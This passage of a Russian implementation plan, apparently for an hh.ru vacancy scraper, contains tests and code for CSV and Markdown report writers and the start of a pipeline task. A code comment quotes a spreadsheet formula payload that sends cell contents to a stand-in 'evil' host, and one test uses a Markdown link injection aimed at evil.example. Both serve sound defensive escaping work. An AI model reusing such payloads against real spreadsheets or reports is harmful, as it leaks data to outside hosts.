    assert text.index("Хорошая вакансия") < text.index("## Остальное")
    assert text.index("## Остальное") < text.index("Так себе вакансия")


def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».

    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Ровно порог") < text.index("## Остальное")
    assert "_ничего выше порога_" not in text


def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Похуже", total=70.0),
            make_scored(vacancy_id="2", title="Получше", total=90.0),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Получше") < text.index("Похуже")


def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "### embedded" in text
    assert "### backend" in text
    assert "https://hh.ru/vacancy/1" in text


def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
    """Три поля, за которые заплачено запросом к странице вакансии. Без них
    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text


def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
    быть — это обычный случай, а не ошибка (спека §3.4)."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(salary=Salary(), area=None)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · — · зарплата не указана" in text


def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
    быть выжимкой и читается дольше, чем сама страница вакансии."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "я" * SNIPPET_LENGTH + "…" in text
    assert "я" * (SNIPPET_LENGTH + 1) not in text


def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
    """Описание приходит со страницы многострочным (`html_to_text` ставит
    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
    это конец пункта для любого рендерера markdown."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Требуется опыт. Yocto и BSP.…" in text


def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
    из `unreported()` навсегда."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("# Новые вакансии") == 2
    assert "Утренняя" in text
    assert "Вечерняя" in text


def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
    на чужой сайт."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[Удалённо\]" in text
    # Единственная настоящая ссылка в отчёте — на hh.ru.
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


# --- фабрика и пустой вход ------------------------------------------------


def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
    CsvSink(tmp_path).emit([], NOW)
    MarkdownSink(tmp_path, threshold=60.0).emit([], NOW)
    assert list(tmp_path.iterdir()) == []


def test_build_sinks_resolves_names(tmp_path: Path) -> None:
    sinks = build_sinks(["csv", "markdown"], tmp_path, threshold=60.0)
    assert [sink.name for sink in sinks] == ["csv", "markdown"]


def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
    отказывает, ничего не создав."""
    with pytest.raises(ValueError, match="telegram"):
        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
    assert list(tmp_path.iterdir()) == []
```

- [ ] **Step 2: Запустить тест и убедиться, что он падает**

Run: `uv run pytest tests/test_sinks.py -v`
Expected: `ModuleNotFoundError: No module named 'hh_search.sinks'`, «1 error»

- [ ] **Step 3: Реализовать `hh_search/sinks/base.py`**

```python
from collections.abc import Sequence
from datetime import datetime
from typing import Protocol

from hh_search.domain.models import ScoredVacancy

# Формат даты в отчётах: без микросекунд и без смещения. Из базы даты
# приходят как aware UTC (`storage/time_utils.py`), то есть isoformat() дал
# бы «2026-07-27T11:48:48.366000+00:00» — Excel такую строку числом не
# считает, а человеку она нечитаема. Время в отчёте — UTC, как в базе.
REPORT_DATE_FORMAT = "%Y-%m-%d %H:%M"


class Sink(Protocol):
    """Точка расширения: сюда позже встанет TelegramSink."""

    name: str

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None: ...
```

- [ ] **Step 4: Реализовать `hh_search/sinks/csv_sink.py`**

```python
import csv
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

from hh_search.domain.models import ScoredVacancy
from hh_search.sinks.base import REPORT_DATE_FORMAT

# `listing`, а не `found_by_query`: после переезда discovery на листинги в
# этом поле лежит slug (`programmist`), а не текст поискового запроса.
COLUMNS = [
    "id",
    "score",
    "cluster",
    "title",
    "company",
    "area",
    "salary_from",
    "salary_to",
    "currency",
    "published_at",
    "listing",
    "url",
]

# Excel и LibreOffice исполняют содержимое ячейки, начинающееся с этих
# символов. Заголовок и название компании пишет работодатель, то есть это
# внешний недоверенный текст: `=HYPERLINK("http://evil/?u="&A1;"вакансия")`
# в заголовке превращает отчёт в утечку. Квотирование модуля csv от формул
# не защищает — оно про разделители, а не про интерпретацию.
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")


def _cell(value: object) -> str:
    """Значение ячейки: строка, обезвреженная от интерпретации формулой.

    Апостроф перед значением — то, что понимают и Excel, и LibreOffice:
    ячейка остаётся текстом. Числовые колонки этого не боятся (они
    формируются нами и неотрицательны), но правило применяется ко всем,
    чтобы не пришлось помнить, какая колонка внешняя.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_STARTS) else text


class CsvSink:
    """Полная выгрузка нового: в CSV идёт всё, порога здесь нет (спека §6.3).

    Формат подчинён единственному потребителю — таблице на рабочем столе:
    UTF-8 с BOM и разделитель `;`, иначе русский текст в Excel читается как
    `ÐžÐžÐž`, а с русской локалью вся строка ложится в одну колонку.
    """

    name = "csv"

    def __init__(self, reports_dir: Path) -> None:
        self._reports_dir = reports_dir

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if not vacancies:
            return
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.csv"
        first_write = not path.exists()
        # BOM обязан быть ровно один: кодек utf-8-sig пишет его при каждом
        # открытии файла, поэтому второй прогон того же дня вставил бы
        # ещё один U+FEFF посреди данных.
        encoding = "utf-8-sig" if first_write else "utf-8"
        with path.open("a", newline="", encoding=encoding) as handle:
            writer = csv.DictWriter(handle, fieldnames=COLUMNS, delimiter=";")
            if first_write:
                writer.writeheader()
            for item in vacancies:
                writer.writerow(self._row(item))

    def _row(self, item: ScoredVacancy) -> dict[str, str]:
        discovered = item.discovered
        salary = discovered.salary
        published_at = discovered.published_at
        return {
            "id": _cell(discovered.id),
            "score": _cell(item.score.total),
            "cluster": _cell(item.cluster),
            "title": _cell(discovered.title),
            "company": _cell(discovered.company),
            "area": _cell(discovered.area),
            "salary_from": _cell(salary.amount_from),
            "salary_to": _cell(salary.amount_to),
            "currency": _cell(salary.currency),
            # Пустая ячейка, а не «None»: дата публикации неизвестна, пока
            # вакансия не обогащена, и выдумывать её нечем (спека §5.3).
            "published_at": _cell(
                None if published_at is None else format(published_at, REPORT_DATE_FORMAT)
            ),
            "listing": _cell(discovered.found_by_query),
            "url": _cell(discovered.url),
        }
```

- [ ] **Step 5: Реализовать `hh_search/sinks/markdown_sink.py`**

```python
import re
from collections.abc import Sequence
from datetime import datetime
from itertools import groupby
from pathlib import Path

from hh_search.domain.models import ScoredVacancy

SNIPPET_LENGTH = 200

# Заголовок и описание пишет работодатель. `[Удалённо] Инженер` в начале
# названия на hh.ru встречается, а `**[Ссылка](https://evil/) конец]
# (https://hh.ru/vacancy/4)**` превращает пункт отчёта в рабочую ссылку на
# чужой сайт. Экранируется то, что меняет структуру строки.
_MARKDOWN_SPECIAL = re.compile(r"([\\`*_\[\]])")


def _collapse(text: str) -> str:
    """Одна строка вместо любого числа: перевод строки внутри пункта списка
    ломает разметку не хуже скобки."""
    return " ".join(text.split())


def _escape(text: str) -> str:
    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)


def _plain(text: str | None, fallback: str = "—") -> str:
    return _escape(_collapse(text)) if text else fallback


class MarkdownSink:
    """Отчёт для чтения глазами: «Топ» по кластерам и свёрнутое «Остальное».

    Порог ничего не прячет, он меняет подробность показа (спека §6.3):
    вакансия на пороге РОВНО попадает в «Топ» (`>=`), а всё, что ниже, —
    одной строкой. Раздел «Остальное» и есть обратная связь по качеству
    скоринга, поэтому пустым он не остаётся молча.
    """

    name = "markdown"

    def __init__(self, reports_dir: Path, threshold: float) -> None:
        self._reports_dir = reports_dir
        self._threshold = threshold

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if not vacancies:
            return
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.md"
        ordered = sorted(vacancies, key=lambda item: item.score.total, reverse=True)
        top = [item for item in ordered if item.score.total >= self._threshold]
        rest = [item for item in ordered if item.score.total < self._threshold]

        lines = [f"# Новые вакансии — {now:%Y-%m-%d %H:%M}", "", "## Топ", ""]
        if top:
            # Сортировка по кластеру устойчива, поэтому внутри кластера
            # сохраняется порядок по убыванию балла из `ordered`.
            for cluster, group in groupby(
                sorted(top, key=lambda item: item.cluster), key=lambda item: item.cluster
            ):
                lines += [f"### {cluster}", ""]
                lines += [self._full_entry(item) for item in group]
        else:
            lines += ["_ничего выше порога_", ""]

        lines += ["## Остальное", ""]
        lines += [self._short_entry(item) for item in rest] if rest else ["_пусто_", ""]

        # Дописывание, а не перезапись: прогон идёт раз в несколько часов, и
        # 'w' затирал бы утренние находки вечерними без следа — переотправки
        # нет по построению, `mark_reported` уводит вакансию из `unreported`
        # навсегда.
        with path.open("a", encoding="utf-8") as handle:
            handle.write("\n".join(lines).rstrip() + "\n\n")

    def _full_entry(self, item: ScoredVacancy) -> str:
        discovered = item.discovered
        snippet = _escape(_collapse(item.details.description)[:SNIPPET_LENGTH])
        return (
            f"**[{_plain(discovered.title)}]({discovered.url})** — {item.score.total:.0f}\n\n"
            f"{_plain(discovered.company)} · {_plain(discovered.area)} · "
            f"{_plain(discovered.salary.raw, fallback='зарплата не указана')}\n\n"
            f"{snippet}…\n"
        )

    def _short_entry(self, item: ScoredVacancy) -> str:
        discovered = item.discovered
        return (
            f"- [{_plain(discovered.title)}]({discovered.url}) — "
            f"{item.score.total:.0f} · {_plain(discovered.company)}"
        )
```

- [ ] **Step 6: Реализовать `hh_search/sinks/__init__.py`**

```python
"""Приёмники отчётов и их фабрика.

`build_sinks` вызывается ДО `start_run()` и до первого сетевого запроса
(требование спеки §7/§9: опечатка роняет процесс на старте). Иначе
неизвестное имя в `app.yaml` обнаруживается в середине прогона — когда за
страницы уже заплачено запросами к hh.ru, а отчёт всё равно не выйдет.
Проверять имена типом (`Literal["csv", "markdown"]` в конфиге) не стали:
это раздвоило бы список приёмников между схемой конфига и этой фабрикой,
а расширение через `Sink` — заявленная точка роста (спека §4.2).
"""

from collections.abc import Sequence
from pathlib import Path

from hh_search.sinks.base import Sink
from hh_search.sinks.csv_sink import CsvSink
from hh_search.sinks.markdown_sink import MarkdownSink

__all__ = ["CsvSink", "MarkdownSink", "Sink", "build_sinks"]


def build_sinks(names: Sequence[str], reports_dir: Path, threshold: float) -> list[Sink]:
    sinks: list[Sink] = []
    for name in names:
        if name == "csv":
            sinks.append(CsvSink(reports_dir))
        elif name == "markdown":
            sinks.append(MarkdownSink(reports_dir, threshold))
        else:
            raise ValueError(f"неизвестный sink: {name}")
    return sinks
```

- [ ] **Step 7: Запустить все проверки**

Run: `uv run pytest tests/test_sinks.py -v && uv run pytest -q && uv run mypy hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/sinks tests/test_sinks.py`
Expected: `18 passed`, затем `277 passed`, `Success: no issues found`, `All checks passed!`,
`5 files already formatted`

- [ ] **Step 8: Коммит**

```bash
git add hh_search/sinks tests/test_sinks.py
git commit -m "feat: отчёты в CSV и Markdown

Оба формата — реализации одного протокола Sink, к которому позже
подключится Telegram без правок в конвейере. Markdown делится на
Топ по кластерам и свёрнутое Остальное: порог ничего не прячет,
он только меняет подробность показа.

Формат подчинён потребителю и внешним данным: BOM и разделитель ';'
(иначе Excel показывает ÐžÐžÐž и одну колонку), префикс ' для значений,
начинающихся с '=', '+', '-', '@' (заголовок пишет работодатель),
экранирование markdown в заголовке и сниппете, явный формат даты
вместо isoformat с микросекундами. Второй прогон дня дописывает
отчёт, а не затирает: переотправки нет по построению."
```

---

### Task 10: Конвейер

**Files:**
- Create: `hh_search/pipeline/__init__.py`, `hh_search/pipeline/stats.py`,
  `hh_search/pipeline/discovery.py`, `hh_search/pipeline/enrichment.py`,
  `hh_search/pipeline/reporting.py`
- Edit: `hh_search/storage/repository.py`, `hh_search/storage/run_log.py` (одна правка подписи,
  см. шаг 1)
- Test: `tests/test_pipeline.py`

**Interfaces:**
- Consumes: всё из задач 1–9
- Produces: `class RunStats` (pydantic: `discovered`, `new_count`, `rejected`, `enriched`,
  `rescored`, `stuck`, `reported`, `status`, `error`; методы `degrade`, `counters`, `exit_code`);
  `RunCounters` (TypedDict полей таблицы `run`); константы `OK`/`PARTIAL`/`FAILED`, `EXIT_CODES`;
  `run_once(config, client, repo, scorer, sinks, now=None) -> RunStats`

**Эта задача переписана целиком.** Прежняя редакция была собрана ревьюером дословно и прогнана
end-to-end: она вызывала три несуществующих метода хранилища и содержала три независимых пути
безвозвратной потери данных, все молчаливые. Ниже — что именно изменилось и почему; без этих
причин код выглядит переусложнённым.

**1. Источник данных другой.** Discovery переехало с RSS на разрешённый листинг
`/vacancies/{slug}` + `?page=N` (RSS запрещён живым `robots.txt`, правило `Disallow: *?*`).
Значит: перебор идёт по листингам И страницам (`for page in range(query.pages)`, каждая
страница — один запрос); `build_rss_url`/`parse_feed` заменяются на
`build_listing_url`/`parse_listing`; листинг отдаёт только `id`, `url`, `title`, а `company`,
`area`, `salary`, `published_at`, `valid_through` приходят на шаге обогащения и пишутся тем же
оператором, что описание и оценка.

**2. Интерфейс хранилища ушёл вперёд на четыре раунда правок Task 6.** Каждая строка ниже
подтверждена исполнением прежней редакции:

| Что вызывала прежняя редакция | Что в хранилище на самом деле | Чем кончалось |
|---|---|---|
| `repo.save_details(id, details)` | метода нет; есть транзакционный `save_enriched(id, details, score)` | `AttributeError` в цикле обогащения ПОСЛЕ скачивания страницы: прогресса нет никогда, нагрузка на hh.ru есть всегда |
| `repo.save_score(id, score)` вторым вызовом | есть, но для пересчёта БЕЗ описания | пара вызовов теряла транзакционность, между ними жило состояние, невидимое всем выборкам |
| — (не вызывался) | `pending_scoring()` | вакансии с обнулённой карантином оценкой копились вечно, в отчёт не попадали, статус прогона `ok` |
| «берём из `unreported()`, там гарантированно есть описание» | `unreported()` требует `description IS NOT NULL AND score_detail IS NOT NULL` | вакансия без оценки не видна ни одной вызываемой выборке |
| `repo.reported_since(cutoff)` | метода не было (добавляется задачей 11) | команда `report` не компилировалась |
| `self._to_discovered(row)` | `mappers.to_discovered(row)` + колонки `CAST(... AS BLOB)` | обход карантина и падение всей выборки на одной битой строке |
| `SELECT v.*` + подзапрос `found_by_query` | `_DISCOVERED_COLUMNS_SQL` + `safe_rows` + колонка `primary_query` | возврат дефекта, на который Task 6 потратил четыре раунда |
| `bump_enrich_attempt(id)` + `mark_rejected(...)` | `bump_enrich_attempt(id, max_attempts)` — лимит и терминальный статус ОДНИМ UPDATE | плановая последовательность воспроизводила Critical, из-за которого вакансия исчезала из всех очередей |
| `finish_run(id, st, error=..., **counters)` | `finished_at` третьим позиционным | 3 ошибки mypy плюс латентная коллизия имени счётчика |
| нет обработки `ParseError` | `parse_listing`/`parse_vacancy_page` бросают `FetchFailed` | тихий ноль вместо громкого отказа |
| `datetime.now()` наивный | `time_utils` требует aware UTC во всех точках обмена | дата в имени файла отчёта расходится с `reported_at` на сутки |

Появившиеся методы, которых прежняя редакция не знала и которые конвейер обязан использовать:
`save_description(id, details)` (страница без оценки), `pending_scoring()`, `reset_cache(url)`,
счётчики прогона `rescored`/`stuck`.

**3. Четыре пути потери данных, закрытые здесь.**

- **Валидатор условного запроса писался ДО разбора выдачи.** Одна обрезанная выдача ослепляла
  сервис навсегда: `ETag` снимка, который никогда не был прочитан, дальше давал вечный 304.
  Воспроизводится без всякой аварии — достаточно, чтобы hh.ru один раз ответил обрезанной
  страницей: прогон 1 `failed`, прогоны 2–4 `{'discovered': 0, 'reported': 0, 'status': 'ok'}`,
  вакансий в базе ноль, healthcheck зелёный, `docker logs` чист. Лечение: валидатор пишется
  ПОСЛЕ того, как все вакансии страницы оказались в базе, а при отказе разбора прежний
  валидатор сбрасывается (`reset_cache`). Это два независимых механизма, и у каждого свой тест.
- **Временная авария hh.ru навсегда выбрасывала всю очередь.** `FetchFailed` от 503/таймаута и
  `RobotsDisallowed` от недоступного robots.txt — состояния СЕРВЕРА, а не вакансии, но они жгли
  `enrich_attempts`. При `interval_hours = 4` и `max_attempts = 3` двенадцати часов
  недоступности хватало, чтобы очередь ушла в `rejected`/`enrich_failed` терминально
  (`{'rejected': 20}`), а после подъёма источника `pending_enrichment` оставался пуст. Спека §9
  для этой строки требует лишь `WARNING` + `partial`. Лечение: транспортный отказ попытку не
  жжёт, отказ самой страницы (404, нет `JobPosting`, пустое `description`) — жжёт.
- **Исключение из скоринга роняло прогон и заставляло перекачивать страницу.**
  `scorer.score(...)` стоял аргументом записи и ничем не был обёрнут: `ZeroDivisionError`
  (достижимая опечаткой `saturation: 0`) улетала наружу, страниц скачано 1, описаний сохранено
  0, при перезапуске страница качалась заново. Лечение: исключение ловится, страница пишется
  через `save_description`, вакансия ждёт в `pending_scoring`.
- **Прогон отчитывался `ok`, не сделав ничего.** Пустой `ItemList` законен для одной страницы,
  но не для всего прогона (требование R-I3, оставленное этой задаче); частичный отказ
  приёмников не понижал статус; статус не влиял на код возврата. Лечение: `RunStats.degrade`,
  агрегатный сторож тишины со статусом `failed` и код возврата из статуса.

**Порядок и правила (спека §4.1, §5.2, §9).**

1. `build_sinks` вызывается ДО `run_once` и до первого сетевого запроса — контракт задачи 9.
   `start_run()` открывает журнал; он закрывается при ЛЮБОМ исходе, включая исключение.
2. Шаг 1: по каждому листингу и каждой его странице `build_listing_url` → `client.get` с
   условными заголовками из `repo.cache_headers` → `304` пропуск → `parse_listing` →
   `add_discovered` → **и только теперь** `save_cache_headers`. Транспортный отказ одной
   страницы: `WARNING`, `partial`, остальные продолжаются.
3. Шаг 2 (дедупликация) — внутри `add_discovered`: новыми считаются те, для которых он вернул
   `True`.
4. Шаг 3: `Prefilter.reason_to_reject` по всей очереди `pending_enrichment`, а не только по
   найденному сейчас — отсев локальный, и правка `negative` обязана достать бэклог.
5. Шаг 4–5: `pending_enrichment(max_attempts)` → `client.get(vacancy_url(id))` →
   `parse_vacancy_page(text, salary_stats)` → `scorer.score` → `save_enriched`. Транспортный
   отказ и отказ страницы разведены (см. выше). Отказ оценки → `save_description`. Больше
   половины провалов → громкая тревога, отдельная для вёрстки и отдельная для недоступности.
6. Шаг 6–7: `rescore` → `unreported()` **дважды** (карантин срабатывает внутри чтения, поэтому
   лечение должно занимать один прогон, а не два), потом остаток очереди пересчёта
   перепроверяется и при непустом — `logger.error` со списком id, `stuck` в журнал, статус
   `partial`. Затем каждый приёмник в `try/except`; `mark_reported` только при успехе ВСЕХ.
7. `finish_run(...)` со статусом и счётчиками.

**Почему `pipeline.py` стал пакетом.** Замер: пять модулей, 646 строк всего, 386 строк кода —
одним файлом это вдвое больше ориентира. Разбито по шагам, а не по строкам: `discovery.py`
(шаги 1–3), `enrichment.py` (4–6), `reporting.py` (7), `stats.py` (счётчики и статус),
`__init__.py` (только `run_once`: порядок шагов и журнал, 58 строк кода). Инвариант «порядок
шагов значим» от разбиения не размазывается — он целиком живёт в `run_once`, который стал
короче и читается за один экран.

- [ ] **Step 1: Правка Task 6 — `finished_at` только по имени**

`finish_run` принимает счётчики через `**counters`, а `finished_at` стоял третьим позиционным
параметром: значение счётчика, переданное позиционно, молча уезжало в дату завершения, а имя
счётчика при этом отбрасывалось белым списком — ошибка тихая с двух сторон. В
`hh_search/storage/run_log.py` и `hh_search/storage/repository.py` добавить `*` перед
`finished_at` (все существующие вызовы уже передают его по имени, тесты не меняются):

```python
    def finish_run(
        self,
        run_id: int,
        status: str,
        *,
        finished_at: datetime | None = None,
        **counters: int | str | None,
    ) -> None:
```

В `repository.py` делегат вызывает `run_log` тоже по имени:
`self._run_log.finish_run(run_id, status, finished_at=finished_at, **counters)`.

**Одного `*` мало, и это проверено исполнением.** `mypy --strict` на
`repo.finish_run(run_id, status, **stats.counters())` продолжает давать три ошибки
`Argument 3 ... has incompatible type "**dict[str, int | str | None]"; expected
"datetime | None"`: распаковку словаря с размытым типом значений mypy сверяет с КАЖДЫМ
именованным параметром, включая `finished_at`, и ключевое-только положение этого не меняет.
Поэтому `RunStats.counters()` возвращает `TypedDict` (см. `stats.py`): у него набор ключей
известен, проверка идёт по именам, а имя счётчика перестаёт быть строкой, которую можно
опечатать.

Run: `uv run mypy --strict hh_search && uv run pytest tests/test_repository.py -q`
Expected: `Success: no issues found`, `56 passed` (тесты хранилища не менялись: все
существующие вызовы уже передают `finished_at` по имени)

- [ ] **Step 2: Написать падающий тест**

Создать `tests/test_pipeline.py`:

```python
import gzip
import json
import logging
import sqlite3
from collections.abc import Sequence
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest
import respx

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, ScoredVacancy, VacancyDetails
from hh_search.errors import AccessForbidden
from hh_search.pipeline import RunStats, run_once
from hh_search.pipeline.stats import RunCounters
from hh_search.scoring.base import Scorer
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sinks.base import Sink
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository
from hh_search.storage.run_log import ALLOWED_RUN_COUNTERS
from tests.test_config import write_config

FIXTURES = Path(__file__).parent / "fixtures"
NOW = datetime(2026, 7, 28, 10, 0, tzinfo=UTC)

# Один листинг, одна страница: `pages: 2` из образца конфига удвоило бы
# каждое число в ожиданиях, ничего не добавив. Пагинация проверяется
# отдельным тестом, где она и есть предмет.
ONE_PAGE = """
queries:
  - slug: programmist
    cluster: embedded
    weight: 9
    pages: 1
"""

LISTING_URL = "https://hh.ru/vacancies/programmist"
PAGE_PATTERN = r"^https://hh\.ru/vacancy/\d+$"


def load(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


def listing_html(*vacancies: tuple[str, str], slug: str = "programmist") -> str:
    """Страница листинга ровно того устройства, что живая: canonical + ItemList."""
    items = [
        {"@type": "ListItem", "url": f"https://hh.ru/vacancy/{vacancy_id}", "name": title}
        for vacancy_id, title in vacancies
    ]
    block = json.dumps({"@type": "ItemList", "itemListElement": items}, ensure_ascii=False)
    return (
        f'<html><head><link rel="canonical" href="https://hh.ru/vacancies/{slug}">'
        f'<script type="application/ld+json">{block}</script></head><body></body></html>'
    )


def page_html(description: str = "Опыт Yocto и Buildroot.") -> str:
    block = json.dumps(
        {
            "@type": "JobPosting",
            "description": f"<p>{description}</p>",
            "hiringOrganization": {"name": "ООО Ромашка"},
        },
        ensure_ascii=False,
    )
    return f'<html><script type="application/ld+json">{block}</script></html>'


TWO_VACANCIES = listing_html(
    ("111", "Senior Embedded Engineer"), ("222", "Junior Python Developer")
)


class RecordingSink:
    """Приёмник, который помнит, что и сколько раз ему отдали."""

    def __init__(self, name: str = "recording", fail: bool = False) -> None:
        self.name = name
        self.batches: list[list[str]] = []
        self._fail = fail

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        if self._fail:
            raise RuntimeError(f"приёмник {self.name} недоступен")
        self.batches.append([item.discovered.id for item in vacancies])

    @property
    def seen(self) -> list[str]:
        return [vacancy_id for batch in self.batches for vacancy_id in batch]


class BrokenScorer:
    """Скорер, падающий на первых `failures` вызовах.

    `ZeroDivisionError` — не выдумка: `saturation: 0` в profile.yaml даёт
    ровно её, причём уже ПОСЛЕ того, как страница скачана.
    """

    def __init__(self, profile: Config, failures: int = 1_000_000) -> None:
        self._real = KeywordScorer(profile.profile)
        self._left = failures
        self.calls = 0

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown:
        self.calls += 1
        if self._left > 0:
            self._left -= 1
            raise ZeroDivisionError("division by zero")
        return self._real.score(discovered, details)


@pytest.fixture()
def config(tmp_path: Path) -> Config:
    return load_config(write_config(tmp_path, **{"queries.yaml": ONE_PAGE}))


@pytest.fixture()
def repo() -> SqliteRepository:
    repository = SqliteRepository(":memory:")
    repository.init_schema()
    return repository


@pytest.fixture()
def db_path(tmp_path: Path) -> str:
    """Путь к файловой базе: нужен там, где база портится сырым SQL."""
    return str(tmp_path / "hh.db")


def make_client(config: Config) -> PoliteClient:
    return PoliteClient(config.app.http, config.app.user_agent, sleep=lambda _: None)


def mock_source(
    listing: str = TWO_VACANCIES,
    page: str | httpx.Response | None = None,
    listing_headers: dict[str, str] | None = None,
) -> tuple[respx.Route, respx.Route, respx.Route]:
    """robots.txt, листинг и страницы вакансий — все три обязательны.

    robots ОБЯЗАТЕЛЕН в каждом тесте: незамоканный запрос даёт
    `AllMockedAssertionError`, а это подкласс `AssertionError`, который
    `_load_robots` не ловит (он ловит `httpx.HTTPError`). Такой прогон
    рвётся насквозь ещё до первого шага, и любой ассерт про конвейер
    проверяет пустоту. Правила берутся живые, из фикстуры: заодно каждый
    прогон конвейера перепроверяет, что выбранные URL источником разрешены.
    """
    robots = respx.get("https://hh.ru/robots.txt").mock(
        return_value=httpx.Response(
            200,
            text=(FIXTURES / "robots_hh.txt").read_text(encoding="utf-8"),
            headers={"Content-Type": "text/plain"},
        )
    )
    listing_route = respx.get(url__startswith=LISTING_URL).mock(
        return_value=httpx.Response(200, text=listing, headers=listing_headers or {})
    )
    body = page if page is not None else page_html()
    page_response = body if isinstance(body, httpx.Response) else httpx.Response(200, text=body)
    page_route = respx.get(url__regex=PAGE_PATTERN).mock(return_value=page_response)
    return robots, listing_route, page_route


def run(
    config: Config,
    repo: SqliteRepository,
    sinks: Sequence[Sink],
    scorer: Scorer | None = None,
    now: datetime = NOW,
) -> RunStats:
    with make_client(config) as client:
        return run_once(config, client, repo, scorer or KeywordScorer(config.profile), sinks, now)


def journal(db: str) -> list[tuple[object, ...]]:
    raw = sqlite3.connect(db)
    rows = raw.execute(
        "SELECT status, discovered, new_count, rejected, enriched, rescored, stuck, reported "
        "FROM run ORDER BY id"
    ).fetchall()
    raw.close()
    return [tuple(row) for row in rows]


def corrupt(db: str, sql: str, *params: object) -> None:
    raw = sqlite3.connect(db)
    raw.execute(sql, params)
    raw.commit()
    raw.close()


# --- прогон целиком, на живых фикстурах -----------------------------------


@respx.mock
def test_live_listing_run_ends_with_measured_counters(
    config: Config, repo: SqliteRepository
) -> None:
    """Живая страница `/vacancies/programmist` и живая страница вакансии.

    Числа зафиксированы по факту: 20 элементов в ItemList, два заголовка с
    «junior» отсеяны префильтром (в профиле образца одно стоп-слово), 18
    страниц скачано, 18 вакансий отправлено. Сверяется ВЕСЬ набор
    счётчиков, потому что именно они уезжают в журнал прогона и в
    healthcheck.
    """
    mock_source(listing=load("listing_programmist.html.gz"), page=load("vacancy_salary.html.gz"))
    sink = RecordingSink()
    stats = run(config, repo, [sink])
    assert (stats.status, stats.error) == ("ok", None)
